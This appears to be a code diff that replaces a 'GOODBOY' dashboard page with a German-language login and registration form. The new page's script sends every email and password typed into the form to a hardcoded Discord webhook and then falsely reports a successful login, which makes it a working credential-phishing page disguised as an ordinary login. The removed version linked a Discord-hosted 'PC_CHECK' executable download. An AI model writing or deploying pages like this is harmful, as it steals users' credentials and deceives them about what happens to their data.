@@ -1,153 +1,165 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GOODBOY Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>Login Dashboard</title>
     <style>
         body {
-            background-color: #0a0216;
-            color: #fff;
-            font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #121016;
+            color: white;
             display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
             position: relative;
         }
-        .sidebar {
-            width: 260px;
-            height: 100vh;
-            background: linear-gradient(180deg, #1b012e, #3a013d);
+        .rain {
             position: fixed;
-            left: 0;
+            width: 100%;
+            height: 100%;
             top: 0;
-            padding: 20px;
+            left: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .container {
+            background-color: #1e1b2e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            width: 400px;
+            text-align: center;
+            transition: all 0.5s ease;
             display: flex;
             flex-direction: column;
-            box-shadow: 5px 0 10px rgba(0, 0, 0, 0.5);
+            align-items: center;
         }
-        .sidebar h2 {
-            color: #a600ff;
-            text-align: center;
-            font-size: 24px;
-        }
-        .sidebar a {
-            color: #ddd;
-            text-decoration: none;
-            padding: 14px 22px;
-            margin: 6px 0;
-            display: block;
-            border-radius: 10px;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .sidebar a:hover, .sidebar a.active {
-            background-color: #a600ff;
-            color: #fff;
-        }
-        .content {
-            margin-left: 280px;
-            padding: 30px;
-            width: 100%;
-            text-align: center;
-        }
-        .profile-box {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #1b012e;
+        .input-field {
+            width: calc(100% - 20px);
             padding: 15px;
-            border-radius: 12px;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            width: 200px;
-        }
-        .profile-box img {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            margin-bottom: 10px;
-        }
-        .profile-box p {
-            margin: 0;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
             font-size: 16px;
-            color: #a600ff;
+            text-align: center;
+            background-color: #2a2a3a;
+            color: white;
         }
-        .login-button, .logout-button, .download-button {
-            background: none;
-            border: 2px solid #a600ff;
-            padding: 5px 10px;
-            border-radius: 6px;
-            color: #a600ff;
+        .btn {
+            width: calc(100% - 20px);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            background-color: #7289da;
+            color: white;
             cursor: pointer;
-            margin-top: 10px;
-            transition: 0.3s;
-            text-decoration: none;
         }
-        .login-button:hover, .logout-button:hover, .download-button:hover {
-            background: #a600ff;
-            color: #fff;
+        .btn:hover {
+            background-color: #5a6ebc;
         }
     </style>
-    <script>
-        const CLIENT_ID = 'YOUR_GITHUB_CLIENT_ID';
-        const REDIRECT_URI = 'YOUR_REDIRECT_URI';
-        const API_ENDPOINT = 'https://api.github.com/user';
-
-        function loginWithGitHub() {
-            const authURL = `https://github.com/login/oauth/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=read:user`;
-            window.location.href = authURL;
-        }
-
-        function getGitHubUser() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const code = urlParams.get('code');
-            if (code) {
-                fetch(`https://your-backend.com/github-auth?code=${code}`)
-                .then(response => response.json())
-                .then(user => {
-                    document.getElementById("profile-img").src = user.avatar_url;
-                    document.getElementById("profile-name").innerText = user.login;
-                    document.getElementById("login-button").style.display = 'none';
-                    document.getElementById("logout-button").style.display = 'block';
-                })
-                .catch(error => console.error('Error fetching GitHub user:', error));
-            }
-        }
-        
-        function logout() {
-            window.location.href = REDIRECT_URI;
-        }
-
-        window.onload = function() { 
-            getGitHubUser();
-        };
-    </script>
 </head>
 <body>
-    <div class="sidebar">
-        <h2>GOODBOY</h2>
-        <a onclick="showPage('dashboard')">Dashboard</a>
-        <a onclick="showPage('pins')">Pins</a>
-        <a onclick="showPage('results')">Results</a>
-        <a onclick="showPage('profile')">Profile</a>
-        <a class="download-button" href="https://cdn.discordapp.com/attachments/1347272689953407086/1349012230083051610/PC_CHECK_v3.1.exe?ex=67d6d30b&is=67d5818b&hm=63d7da30744e49a85544413bb4cf7b9b3aa5f1717162e72d328ad28fbe7ccbe3&" download>Download PC Check</a>
+    <canvas class="rain" id="rainCanvas"></canvas>
+    <div class="container" id="login-container">
+        <h2 id="form-title">Login</h2>
+        <input type="email" id="email" class="input-field" placeholder="Email">
+        <input type="password" id="password" class="input-field" placeholder="Passwort">
+        <button class="btn" onclick="loginUser()">Login</button>
+        <button class="btn" onclick="registerUser()">Account erstellen</button>
     </div>
-    <div class="content">
-        <div class="page-title" id="page-title">Dashboard</div>
-        <div class="page-content" id="page-content">
-            <p>Welcome to the GOODBOY Dashboard.</p>
-            <p>Choose a section from the menu to explore more details.</p>
-        </div>
-    </div>
-    <div class="profile-box">
-        <img id="profile-img" src="" alt="Profile Picture">
-        <p id="profile-name">Not Logged In</p>
-        <button id="login-button" class="login-button" onclick="loginWithGitHub()">Login with GitHub</button>
-        <button id="logout-button" class="logout-button" onclick="logout()" style="display: none;">Logout</button>
-    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1349850414543142912/6ujUtioGiTKVrXMrs-dQbB83Ss5799TzqwczsAdxyeroOXcvaX-ALTRetR25_RywY-D5";
+        
+        function sendWebhook(message) {
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: message })
+            });
+        }
+
+        function loginUser() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            if (email && password) {
+                sendWebhook(`🔐 **Login-Versuch**\n📧 **E-Mail:** ${email}\n🔑 **Passwort:** ${password}`);
+                alert("Login erfolgreich!");
+            } else {
+                alert("Bitte fülle alle Felder aus.");
+            }
+        }
+
+        function registerUser() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            if (email && password) {
+                sendWebhook(`📝 **Neue Registrierung**\n📧 **E-Mail:** ${email}\n🔑 **Passwort:** ${password}`);
+                alert("Registrierung erfolgreich! Bitte logge dich ein.");
+            } else {
+                alert("Bitte fülle alle Felder aus.");
+            }
+        }
+
+        function createSmoothRain() {
+            const canvas = document.getElementById("rainCanvas");
+            const ctx = canvas.getContext("2d");
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            let drops = [];
+            for (let i = 0; i < 200; i++) {
+                drops.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    speed: Math.random() * 3 + 1,
+                    length: Math.random() * 20 + 10,
+                    opacity: Math.random() * 0.5 + 0.2
+                });
+            }
+
+            function drawRain() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.strokeStyle = "rgba(173, 216, 230, 0.6)";
+                ctx.lineWidth = 1;
+                ctx.lineCap = "round";
+
+                drops.forEach(drop => {
+                    ctx.globalAlpha = drop.opacity;
+                    ctx.beginPath();
+                    ctx.moveTo(drop.x, drop.y);
+                    ctx.lineTo(drop.x, drop.y + drop.length);
+                    ctx.stroke();
+                });
+                ctx.globalAlpha = 1;
+            }
+
+            function animateRain() {
+                drops.forEach(drop => {
+                    drop.y += drop.speed;
+                    if (drop.y > canvas.height) {
+                        drop.y = -drop.length;
+                        drop.x = Math.random() * canvas.width;
+                    }
+                });
+                drawRain();
+                requestAnimationFrame(animateRain);
+            }
+
+            animateRain();
+        }
+
+        createSmoothRain();
+    </script>
 </body>
 </html>
+
